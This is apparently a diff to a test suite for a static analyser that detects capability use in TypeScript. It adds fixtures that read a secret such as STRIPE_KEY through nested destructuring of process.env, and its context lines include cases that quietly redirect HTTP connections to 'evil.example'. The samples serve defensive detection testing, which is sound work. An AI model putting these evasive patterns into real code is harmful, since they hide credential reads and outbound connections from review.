@@ -292,6 +292,14 @@ const caught: Record<string, string> = {
   rd58_fetch_init_variable: "export function t(init: RequestInit) { return fetch(\"https://good.example/\", init); }",
   rd59_http_agent_subclass: "import http from \"node:http\";\nimport net from \"node:net\";\nclass A extends http.Agent { createConnection() { return net.connect(443, \"evil.example\"); } }\nexport function t() { return http.request({ hostname: \"good.example\", agent: new A() }); }",
   rd60_http_agent_const_written: "import https from \"node:https\";\nimport net from \"node:net\";\nconst agent = new https.Agent({ keepAlive: true });\nObject.assign(agent, { createConnection: () => net.connect(443, \"evil.example\") });\nexport function t() { return https.get({ hostname: \"good.example\", agent }); }",
+  // The environment destructured out of `process` (or `globalThis`) in one pattern.
+  rd70_env_nested_destructure: "export function t() { const { env: { STRIPE_KEY = \"x\" } } = process; return STRIPE_KEY; }",
+  rd71_env_nested_rest: "export function t() { const { env: { ...all } } = process; return all; }",
+  rd72_env_global_nested: "export function t() { const { process: { env: { STRIPE_KEY } } } = globalThis; return STRIPE_KEY; }",
+  rd73_env_parameter_nested: "export function t({ env: { STRIPE_KEY } }: NodeJS.Process = process) { return STRIPE_KEY; }",
+  rd74_env_assignment_pattern: "export function t() { let k: string | undefined; ({ env: { STRIPE_KEY: k } } = process); return k; }",
+  rd75_env_nested_computed: "export function t(name: string) { const { env: { [name]: v } } = process; return v; }",
+  rd76_env_quoted_key: "export function t() { const { \"STRIPE_KEY\": k, [\"OTHER\"]: o } = process.env; return [k, o]; }",
 };
 
 // Harmless code that must not be reported, including common `any` casts that reach no capability.
@@ -373,6 +381,7 @@ const silent: Record<string, string> = {
   rd_fp40_script_lookalikes: "export function t() { const registry = { register: (x: string) => x }; return [registry.register(\"/sw.js\"), process.report.getReport()]; }",
   rd_fp50_host_options_precise: "import tls from \"node:tls\";\nimport net from \"node:net\";\nimport http from \"node:http\";\nimport http2 from \"node:http2\";\n/** @perm net(good.example) */\nexport function t(d: string) {\n  tls.connect(443, \"good.example\", { servername: \"good.example\", rejectUnauthorized: true }, () => {}).end(d);\n  tls.connect(443, \"good.example\", { host: \"good.example\" }).end(d);\n  net.connect(443, \"good.example\", () => {}).end(d);\n  http.request({ hostname: \"good.example\", agent: new http.Agent({ keepAlive: true }) }).end(d);\n  http.get(\"http://good.example/\", { agent: false });\n  http2.connect(\"https://good.example\", { host: \"good.example\" }, () => {});\n  http2.connect(\"https://good.example\", () => {});\n  return fetch(\"https://good.example/\", { method: \"POST\", headers: { a: \"b\" }, body: d, signal: undefined });\n}",
   rd_fp51_shared_agent: "import https from \"node:https\";\nconst keepAlive = new https.Agent({ keepAlive: true });\nconst agent = new https.Agent();\n/** @perm net(good.example) */\nexport function t() { return [https.get({ hostname: \"good.example\", agent: keepAlive }), https.get(\"https://good.example/\", { agent })]; }\nexport function stop() { keepAlive.destroy(); }",
+  rd_fp70_env_lookalike_patterns: "/** @perm env(MODE) */\nexport function t(cfg: { env: { MODE: string; OTHER: string } }) { const { env: { OTHER } } = cfg; const { env: { MODE } } = process; let a = \"\"; ({ a } = { a: OTHER }); return [a, MODE]; }",
 };
 
 const knownMisses: Record<string, { why: string; code: string }> = {
@@ -464,4 +473,12 @@ describe("re-verification (detectors): reported as the access it is", () => {
   }
   // The agent's const is changed, so the request could go anywhere; the top-level code that changes it is reported too.
   it("rd60_http_agent_const_written", () => expect(errorsIn("rd60_http_agent_const_written").filter((d) => d.function === "t").map((d) => d.capability)).toEqual(["net"]));
+  it("rd70_env_nested_destructure", () => expect(capabilities("rd70_env_nested_destructure")).toEqual(["env(STRIPE_KEY)"]));
+  it("rd71_env_nested_rest", () => expect(capabilities("rd71_env_nested_rest")).toEqual(["env"]));
+  it("rd72_env_global_nested", () => expect(capabilities("rd72_env_global_nested")).toEqual(["env(STRIPE_KEY)"]));
+  it("rd73_env_parameter_nested", () => expect(capabilities("rd73_env_parameter_nested")).toEqual(["env(STRIPE_KEY)"]));
+  it("rd74_env_assignment_pattern", () => expect(capabilities("rd74_env_assignment_pattern")).toEqual(["env(STRIPE_KEY)"]));
+  it("rd75_env_nested_computed", () => expect(capabilities("rd75_env_nested_computed")).toEqual(["env"]));
+  // A quoted or literal computed key names the variable without its quotes.
+  it("rd76_env_quoted_key", () => expect(capabilities("rd76_env_quoted_key")).toEqual(["env(OTHER)", "env(STRIPE_KEY)"]));
 });
